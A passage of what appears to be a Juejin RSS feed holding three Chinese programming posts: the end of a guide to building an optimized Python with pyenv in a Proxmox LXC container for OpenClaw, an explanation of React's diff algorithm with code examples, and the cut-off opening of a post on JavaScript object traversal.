<h2 data-id="heading-10">结语</h2>
<p>通过这种循序渐进的精准编译策略，我们不仅解决了 <code>ModuleNotFoundError</code> 等痛点，更在 LXC 容器内打造出了一个极其强悍的 Python 环境。对于 <strong>OpenClaw</strong> 这种对底层响应有要求的应用，这种深度的性能压榨绝对值得一试。</p>
<hr/>
<p><strong>博文小贴士</strong>：</p>
<ul>
<li><strong>适用读者</strong>：追求极致性能的 PVE 用户、OpenClaw 开发者。</li>
<li><strong>所需耗时</strong>：根据 CPU 性能，大约 15-45 分钟。</li>
</ul>
<h2 data-id="heading-11">附录：一键“满血炼丹”脚本</h2>
<p>如果你不想手动输入上述指令，可以将以下代码保存为 <code>build_python.sh</code> 并运行。它集成了依赖检查、环境清理与极致性能编译流程。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 1. 精准依赖检查</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"正在安装核心编译依赖..."</span>
sudo apt update &amp;&amp; sudo apt install -y --no-install-recommends \
    gcc make pkg-config libssl-dev libffi-dev zlib1g-dev \
    liblzma-dev libsqlite3-dev

<span class="hljs-comment"># 2. 设置极致性能环境变量</span>
<span class="hljs-built_in">export</span> AR=<span class="hljs-string">"gcc-ar"</span>
<span class="hljs-built_in">export</span> NM=<span class="hljs-string">"gcc-nm"</span>
<span class="hljs-built_in">export</span> RANLIB=<span class="hljs-string">"gcc-ranlib"</span>
<span class="hljs-built_in">export</span> CFLAGS=<span class="hljs-string">"-march=native -O3 -flto=auto"</span>
<span class="hljs-built_in">export</span> LDFLAGS=<span class="hljs-string">"-flto=auto -fuse-linker-plugin"</span>

<span class="hljs-comment"># 3. 执行安装 (以 3.12.12 为例)</span>
VERSION=<span class="hljs-string">"3.12.12"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"开始编译 Python <span class="hljs-variable">$VERSION</span>，这可能需要较长时间，请保持 CPU 凉爽..."</span>

pyenv uninstall -f <span class="hljs-variable">$VERSION</span>
PYTHON_CONFIGURE_OPTS=<span class="hljs-string">"--enable-optimizations --with-lto --enable-shared"</span> \
pyenv install <span class="hljs-variable">$VERSION</span>

<span class="hljs-comment"># 4. 最终验证</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"正在验证编译成果..."</span>
~/.pyenv/versions/<span class="hljs-variable">$VERSION</span>/bin/python3 -c <span class="hljs-string">"import _ssl, _lzma; print('✅ 编译成功：SSL/LZMA 模块正常')"</span>
~/.pyenv/versions/<span class="hljs-variable">$VERSION</span>/bin/python3 -c <span class="hljs-string">"import sysconfig; print('✅ 参数确认：', sysconfig.get_config_var('CONFIG_ARGS'))"</span>
</code></pre>
<p>补充：</p>
<p>如何配置入 OpenClaw。编辑<code>openclaw.json</code>，加入改写环境变量：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"env"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"PYENV_ROOT"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/root/.pyenv"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"PATH"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/root/.pyenv/shims:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<hr/>
<h3 data-id="heading-12">💡 最后的博主建议</h3>
<p>在执行脚本前，建议通过 <code>htop</code> 观察你的 PVE 宿主机状态。开启 PGO 优化后，Python 编译器的并行效率极高，如果你分配了多个 CPU 核心，它们会全部进入满载状态。这正是硬件被推向极限的证明。</p>
<p>祝你的 OpenClaw 在这个满血版 Python 环境下跑得比以往任何时候都快！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React学习-Diff]]></title>    <link>https://juejin.cn/post/7602901195153915956</link>    <guid>https://juejin.cn/post/7602901195153915956</guid>    <pubDate>2026-02-05T04:03:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602901195153915956" data-draft-id="7602929352716255232" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React学习-Diff"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T04:03:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="web_bee"/> <meta itemprop="url" content="https://juejin.cn/user/428665740231"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React学习-Diff
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/428665740231/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    web_bee
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T04:03:51.000Z" title="Thu Feb 05 2026 04:03:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Diff 算法</h2>
<p>先看一张图，描述了在state\props 更新后，react的工作流程</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c4baeefd3bd421dbb3fdd6cbb2d66b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2ViX2JlZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770869031&amp;x-signature=FeBE9YGWBqyFMcosibJLx367JQA%3D" alt="diff1.png" loading="lazy"/></p>
<p>React 的 <strong>Diff 算法</strong>（也称为 <strong>Reconciliation 算法</strong>）是 React 用于高效更新 UI 的核心机制之一。它的目标是在组件状态发生变化时，以最小的 DOM 操作代价将旧的虚拟 DOM（Virtual DOM）树更新为新的虚拟 DOM 树。</p>
<p>Diff 算法的核心就是 - 复用！</p>
<h3 data-id="heading-1">1. Diff 的三大核心比较原则</h3>
<ul>
<li><strong>同一层级的节点进行比较（Tree Diff 只在同一层级进行）</strong></li>
<li><strong>DOM元素\组件，通过类型判断是否复用</strong></li>
<li><strong>使用 key 属性来判断列表中元素是否复用</strong></li>
</ul>
<h3 data-id="heading-2">2. 比较原则详解</h3>
<h4 data-id="heading-3"><strong>2.1 基本前提：Diff 只在同一层级进行</strong></h4>
<p>React 的 Diff 是<strong>逐层比较</strong>（level-by-level），不会跨层级移动节点。 例如：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 旧树</span>
&lt;<span class="hljs-selector-tag">div</span>&gt;
  &lt;<span class="hljs-selector-tag">span</span>&gt;<span class="hljs-selector-tag">A</span>&lt;/<span class="hljs-selector-tag">span</span>&gt;
  &lt;<span class="hljs-selector-tag">p</span>&gt;<span class="hljs-selector-tag">B</span>&lt;/<span class="hljs-selector-tag">p</span>&gt;
&lt;/<span class="hljs-selector-tag">div</span>&gt;
​
<span class="hljs-comment">// 新树</span>
&lt;<span class="hljs-selector-tag">div</span>&gt;
  &lt;<span class="hljs-selector-tag">p</span>&gt;<span class="hljs-selector-tag">B</span>&lt;/<span class="hljs-selector-tag">p</span>&gt;
  &lt;<span class="hljs-selector-tag">span</span>&gt;<span class="hljs-selector-tag">A</span>&lt;/<span class="hljs-selector-tag">span</span>&gt;
&lt;/<span class="hljs-selector-tag">div</span>&gt;
</code></pre>
<p>React <strong>不会</strong>认为 <code>&lt;span&gt;</code> 和 <code>&lt;p&gt;</code> 是“交换了位置”，而是：</p>
<ul>
<li>第一个子节点：<code>&lt;span&gt;</code> → <code>&lt;p&gt;</code>：类型不同 → 销毁 <code>&lt;span&gt;</code>，创建 <code>&lt;p&gt;</code></li>
<li>第二个子节点：<code>&lt;p&gt;</code> → <code>&lt;span&gt;</code>：类型不同 → 销毁 <code>&lt;p&gt;</code>，创建 <code>&lt;span&gt;</code></li>
</ul>
<p><strong>除非使用 <code>key</code></strong>，否则 React 不会尝试“移动”节点。</p>
<h4 data-id="heading-4"><strong>2.2 DOM 元素（如</strong> <code>&lt;div&gt;</code> <strong>,</strong> <code>&lt;span&gt;</code> <strong>）的复用判断</strong></h4>
<p>判断条件：标签名（type）必须完全相同</p>
<ul>
<li>如果新旧虚拟 DOM 节点的 <code>type</code> 相同（比如都是 <code>'div'</code>），则<strong>复用真实 DOM 节点</strong>。</li>
<li>然后对比 <code>props</code>，只更新发生变化的属性（如 <code>className</code>, <code>style</code>, <code>onClick</code> 等）。</li>
</ul>
<p><strong>示例 1：复用 ✅</strong></p>
<pre><code class="hljs language-css" lang="css">// 旧 VNode: { type: <span class="hljs-string">'div'</span>, props: { className: <span class="hljs-string">'red'</span> } }
// 新 VNode: { type: <span class="hljs-string">'div'</span>, props: { className: <span class="hljs-string">'blue'</span> } }
</code></pre>
<p>→ 复用同一个 <code>&lt;div&gt;</code> 元素，仅将 <code>className</code> 从 <code>'red'</code> 改为 <code>'blue'</code>。</p>
<p><strong>示例 2：不复用 ❌</strong></p>
<pre><code class="hljs language-css" lang="css">// 旧 VNode: { type: <span class="hljs-string">'div'</span>, ... }
// 新 VNode: { type: <span class="hljs-string">'span'</span>, ... }
</code></pre>
<p>→ 类型不同，<strong>销毁整个旧子树</strong>，创建新的 <code>&lt;span&gt;</code> 及其子树。</p>
<blockquote>
<p>💡 注意：<code>type</code> 是字符串（原生 DOM 标签）或函数/类（组件）。</p>
</blockquote>
<h4 data-id="heading-5"><strong>2.3 组件（Component）的复用判断</strong></h4>
<p>组件分为 <strong>函数组件</strong> 和 <strong>类组件</strong>，但 React 对它们的复用判断逻辑一致。</p>
<p><strong>判断条件：组件的构造函数（或函数引用）必须是同一个</strong></p>
<p>也就是说，组件的 <code>type</code> 必须严格相等（===）。</p>
<p><strong>示例 1：复用 ✅（同一组件）</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyButton</span>(<span class="hljs-params">{ label }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>{label}<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
​
<span class="hljs-comment">// 渲染</span>
&lt;<span class="hljs-title class_">MyButton</span> label=<span class="hljs-string">"Click"</span> /&gt;
<span class="hljs-comment">// 下次更新</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">MyButton</span> <span class="hljs-attr">label</span>=<span class="hljs-string">"Press"</span> /&gt;</span></span>
</code></pre>
<p>→ <code>type</code> 都是 <code>MyButton</code> 函数（引用相同）→ <strong>复用组件实例</strong>（对函数组件来说是 Fiber 节点），调用新 <code>render</code>（即重新执行函数），但不会卸载/重建。</p>
<p>对于类组件，还会<strong>保留 state 和 ref</strong>。</p>
<p><strong>示例 2：不复用 ❌（不同组件）</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">{condition ? <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LoginButton</span> /&gt;</span></span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LogoutButton</span> /&gt;</span></span>}
</code></pre>
<p>→ <code>LoginButton !== LogoutButton</code> → 即使结构相似，React 也会：</p>
<ul>
<li>卸载 <code>LoginButton</code>（触发 <code>componentWillUnmount</code> / <code>useEffect cleanup</code>）</li>
<li>创建 <code>LogoutButton</code>（触发 <code>constructor</code> / <code>useEffect</code>）</li>
</ul>
<p><strong>示例 3：动态组件陷阱 ❌</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ❌ 每次渲染都定义新组件！</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">TempButton</span> = (<span class="hljs-params"/>) =&gt; <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Temp<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">TempButton</span> /&gt;</span></span>;
}
</code></pre>
<p>→ 每次 <code>Parent</code> 重渲染，<code>TempButton</code> 都是一个<strong>新的函数引用</strong> → React 认为组件类型变了 → <strong>不断销毁重建</strong> → 状态丢失、性能差。</p>
<p>✅ 正确做法：将组件定义提到外部或用 <code>useMemo</code> 缓存（但通常应避免内联定义组件）。</p>
<h4 data-id="heading-6">2.4 列表中节点的复用：<code>key</code> 的作用</h4>
<p>当处理兄弟节点列表时（如 <code>map()</code> 渲染），React 默认按<strong>索引位置</strong>比对。但这样无法正确识别“移动”或“插入”。</p>
<p><strong><code>key</code> 的核心作用：标识节点的唯一身份</strong></p>
<p>React 通过 <code>key</code> 建立 <strong>“旧节点 key → 旧节点” 的映射表</strong>，然后遍历新列表：</p>
<ol>
<li>对每个新节点，用 <code>key</code> 查找是否有对应的旧节点。</li>
<li>如果找到且 <code>type</code> 相同 → <strong>复用该 DOM/组件</strong>。</li>
<li>如果 <code>type</code> 不同 → 销毁旧节点，创建新节点。</li>
<li>如果 <code>key</code> 不存在于旧列表 → 创建新节点。</li>
<li>旧列表中未被匹配的节点 → 删除。</li>
</ol>
<p><strong>示例：带 key 的列表更新</strong></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 旧</span>
[
  { key: <span class="hljs-string">'a'</span>, <span class="hljs-keyword">type</span>: <span class="hljs-string">'li'</span>, children: <span class="hljs-string">'Apple'</span> },
  { key: <span class="hljs-string">'b'</span>, <span class="hljs-keyword">type</span>: <span class="hljs-string">'li'</span>, children: <span class="hljs-string">'Banana'</span> }
]
​
<span class="hljs-comment">// 新</span>
[
  { key: <span class="hljs-string">'b'</span>, <span class="hljs-keyword">type</span>: <span class="hljs-string">'li'</span>, children: <span class="hljs-string">'Banana!'</span> },
  { key: <span class="hljs-string">'c'</span>, <span class="hljs-keyword">type</span>: <span class="hljs-string">'li'</span>, children: <span class="hljs-string">'Cherry'</span> }
]
</code></pre>
<p>Diff 过程：</p>
<ul>
<li><code>key='b'</code>：存在，type 相同 → <strong>复用</strong> <code>&lt;li&gt;</code>，更新文本为 <code>'Banana!'</code></li>
<li><code>key='c'</code>：新增 → 创建新 <code>&lt;li&gt;</code></li>
<li><code>key='a'</code>：未被使用 → 删除</li>
</ul>
<p>✅ 结果：只有 Apple 被删，Banana 节点被复用（保持 focus、动画状态等），Cherry 新增。</p>
<p><strong>如果不用 key（或用 index）：</strong></p>
<ul>
<li>插入到开头会导致后续所有项被重新渲染，即使内容没变。</li>
</ul>
<h3 data-id="heading-7">3. 比较过程</h3>
<p>主要分为两个阶段：</p>
<p><strong>第一个阶段：</strong></p>
<p>通过索引一一对比，如果可以复用就下一个，不可以复用就结束。</p>
<p><strong>第二个阶段：</strong></p>
<p>把剩下的<code>旧 fiber</code> 放到 map 里，遍历剩余的 <code>新 vdom</code>，一一查找 map 中是否有可复用的节点。</p>
<p>最后，</p>
<p>把剩下的老 fiber 删掉</p>
<p>剩下的新 vdom 新增</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JS 对象遍历全解析]]></title>    <link>https://juejin.cn/post/7602846823327055907</link>    <guid>https://juejin.cn/post/7602846823327055907</guid>    <pubDate>2026-02-05T05:25:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602846823327055907" data-draft-id="7602825342229430306" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JS 对象遍历全解析"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-02-05T05:25:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不想秃头的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/2754702534251820"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JS 对象遍历全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2754702534251820/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不想秃头的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T05:25:28.000Z" title="Thu Feb 05 2026 05:25:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JS 对象遍历全解析：从基础到实战，新手也能轻松上手</h2>
<p>在 JavaScript 开发中，对象（Object）是最常用的数据结构之一，几乎所有业务场景都会涉及到对象的遍历——比如获取对象的所有属性、筛选符合条件的键值对、批量处理对象数据等。</p>
<p>但很多新手在面对对象遍历时，总会困惑：<code>for...in</code> 和 <code>Object.keys()</code> 有什么区别？什么时候用 <code>Object.values()</code>？如何遍历对象的原型链属性？</p>
<p>今天这篇文章，就带你彻底吃透 JS 对象遍历的所有常用方法，从基础用法到进阶技巧，再到实战场景对比，帮你避开坑点、灵活运用。</p>
<h3 data-id="heading-1">一、先明确：什么是 JS 对象？</h3>
<p>在开始遍历之前，我们先简单回顾下 JS 对象的基础——对象是由 <code>键（key）</code> 和 <code>值（value）</code> 组成的无序集合，键通常是字符串（ES6 后支持 Symbol），值可以是任意数据类型（字符串、数字、函数、对象等）。</p>
<p>示例对象（后文所有方法均基于此对象演示）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 基础对象</span>
<span class="hljs-keyword">const</span> user = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"掘金小册"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">3</span>,
  <span class="hljs-attr">gender</span>: <span class="hljs-string">"male"</span>,
